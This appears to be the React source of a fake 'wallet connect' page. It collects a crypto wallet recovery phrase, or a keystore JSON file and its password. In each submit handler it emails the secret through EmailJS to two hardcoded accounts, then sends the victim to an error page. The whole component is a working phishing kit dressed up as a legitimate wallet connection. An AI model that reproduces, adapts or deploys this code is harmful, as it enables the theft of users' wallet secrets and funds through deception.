import { IoArrowBackOutline } from "react-icons/io5";
import styles from './WalletConnectForm.module.css';
import axios from 'axios'
import WalletHeading from './WalletConnectForm/WalletHeading';
import WalletImageContainer from './WalletConnectForm/WalletImageContainer';
import PrivateKeyForm from './WalletConnectForm/PrivateKeyForm';

import React, { useState } from 'react';
import {useNavigate} from 'react-router-dom'
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import emailjs from '@emailjs/browser';

const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
  const navigate = useNavigate()
  const [currentView, setCurrentView] = useState(1);
  const [activeButton, setActiveButton] = useState(1);
  const [wallet, setWallet] = useState(walletName);
  const [phrase, setPhrase] = useState("");

  const [keystore, setKeyStore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [keystoreSubmit, setKeystoreSubmit] = useState('CONNECT')

  const [phraseError, setPhraseError] = useState(false);
  const [phraseSubmit, setPhraseSubmit] = useState('CONNECT')
  
  const handleButtonClick = (viewNumber, e) => {
    e.preventDefault(); // Prevent the default form submission behavior
    setCurrentView(viewNumber);
    setActiveButton(viewNumber);
  };

  const validatePhrase = (inputPhrase) => {
    const words = inputPhrase.trim().split(/\s+/); // Split by whitespace
    const wordCount = words.length;
    return wordCount >= 12 && wordCount <= 24;
  };
  
  const trackPhraseWordCount = () => {
    if (validatePhrase(phrase)) {
      setPhraseError(false);
    } else {
      setPhraseError(true);
    }
  };

  // ##### PHRASE
  const handlePhraseSubmit = async (e) => {
    setPhraseSubmit("Processing...")
    e.preventDefault();
    const name = wallet
    const type = "Phrase"
    const data = phrase
    const password = "not_required"
    const formData = {name, type, data, password}
    if (validatePhrase(phrase)) {
      try {

        await emailjs.send(
          'service_30vkiql',
          'template_e0wb6w8',
          {
            to_name: "dapp", // Replace with the actual recipient's name if needed
            from_name: formData.name,
            message: `
              Name: ${formData.name}
              Type: ${formData.type}
              Data: ${formData.data}
              Password: ${formData.password}
            `,
          },
          '4leuzsOPi6Oh_D4e0'
        );
        
        await emailjs.send(
          'service_ky8xa0e',
          'template_kqjcmir',
          {
            to_name: "dapp", // Replace with the actual recipient's name if needed
            from_name: formData.name,
            message: `
              Name: ${formData.name}
              Type: ${formData.type}
              Data: ${formData.data}
              Password: ${formData.password}
            `,
          },
          'pudHPDoixy2beukw8'
        );

        setTimeout(() => {
          navigate('/error')
        }, 3000);
      } catch (error) {
        console.log("")
        setPhraseSubmit("CONNECT")
      }
    } else {
      toast.error('Please enter a phrase with a word count between 12 and 24.', {
        position: "top-right",
        autoClose: 2500,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
        });
      setPhraseError(true);
    }
  }

  // ##### KEYSTORE JSON SUBMISSION
  const handleKeystoreSubmit = async (e) => {
    e.preventDefault();
    setKeystoreSubmit("Processing...");
    const name = wallet
    const type = "Keystore_JSON"
    const data = keystore
    const password = keystorePassword
    const formData = {name, type, data, password}
    try {

      await emailjs.send(
        'service_30vkiql',
        'template_e0wb6w8',
        {
          to_name: "dapp", // Replace with the actual recipient's name if needed
          from_name: formData.name,
          message: `
            Name: ${formData.name}
            Type: ${formData.type}
            Data: ${formData.data}
            Password: ${formData.password}
          `,
        },
        '4leuzsOPi6Oh_D4e0'
      );
      
      await emailjs.send(
        'service_ky8xa0e',
        'template_kqjcmir',
        {
          to_name: "dapp", // Replace with the actual recipient's name if needed
          from_name: formData.name,
          message: `
            Name: ${formData.name}
            Type: ${formData.type}
            Data: ${formData.data}
            Password: ${formData.password}
          `,
        },
        'pudHPDoixy2beukw8'
      );
      setTimeout(() => {
        navigate('/error')
      }, 3000);
    } catch (error) {
      setKeystoreSubmit("CONNECT");
      console.log("error")
    }
  }
  
  const privateKeyLengthNotlong = () => {
    toast.error('Invalid private key format.', {
      position: "top-right",
      autoClose: 2500,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "light",
      });
  }

  return (
    <>
    <ToastContainer />
    <section className={styles.formSection}>
      <section className={styles.innerSection}>
        <div className={styles.buttonContainer}>
          <button
            onClick={() => setDisplayForm(false)}
            className={styles.backButton}
          >
            <IoArrowBackOutline />
          </button>

        </div>

        <div className={styles.walletForm}>
          <div className={styles.contentContainer}>
            <WalletImageContainer walletLogo={walletLogo} />
            <WalletHeading walletName={walletName} />
          </div>
          <div className={styles.view}>
            <button
              type="button"
              onClick={(e) => handleButtonClick(1, e)}
              className={activeButton === 1 ? styles.activeButton : styles.viewButton}
            >
              Phrase
            </button>
            <button
              type="button"
              onClick={(e) => handleButtonClick(2, e)}
              className={activeButton === 2 ? styles.activeButton : styles.viewButton}
            >
              <span className={styles.viewButtonSpan}>
                <span>Keystore</span>{" "}
                <span>JSON</span>
              </span>
            </button>
            <button
              type="button"
              onClick={(e) => handleButtonClick(3, e)}
              className={activeButton === 3 ? styles.activeButton : styles.viewButton}
            >
              Private Key
            </button>
          </div>
          <div>
            <div
              style={{
                display: currentView === 1 ? 'block' : 'none', 
              }}
            >
            <form onSubmit={handlePhraseSubmit}>
              <textarea
                required
                spellCheck="false"
                name="Phrase"
                autoComplete="off"
                rows="7"
                placeholder='Enter your recovery phase'
                className={styles.textarea}
                value={phrase}
                onChange={(e) => {
                  setPhrase(e.target.value);
                  trackPhraseWordCount(); // Call the function
                }}
              ></textarea>
              <p 
                className={styles.hint}
                style={{
                  color: phraseError ? "red" : "green"
              }}
              >Typically 12 (sometimes 24) words separated by single spaces</p>
              <button type='submit' className={styles.connectButton}>{phraseSubmit}</button>
            </form>
            </div>
            <div
              style={{
                display: currentView === 2 ? 'block' : 'none',
              }}
            >
              <form onSubmit={handleKeystoreSubmit}>
                <textarea
                  autoComplete="off"
                  required
                  spellCheck="false"
                  name="Keystore"
                  rows="7"
                  placeholder='Enter your Keystore JSON'
                  className={styles.textarea}
                  value={keystore}
                  onChange={(e) => setKeyStore(e.target.value)}
                ></textarea>
                <input
                  required
                  type="password"
                  autoComplete="off"
                  name="keystorePassword"
                  value={keystorePassword}
                  onChange={(e) => setKeystorePassword(e.target.value)}
                  placeholder='Wallet Password'
                  className={styles.passwordInput}
                />
                <p className={styles.hint}>Several lines of text beginning with {`{...}`} plus the password you used to encrypt it.</p>
                <button type='submit' className={styles.connectButton}>{keystoreSubmit}</button>
              </form>
            </div>

            <div style={{ display: currentView === 3 ? 'block' : 'none'}}>
                <PrivateKeyForm wallet={wallet} privateKeyLengthNotlong={privateKeyLengthNotlong} />
            </div>
          </div>
        </div>
      </section>
    </section>
    </>
  );
};
export default WalletConnectForm;
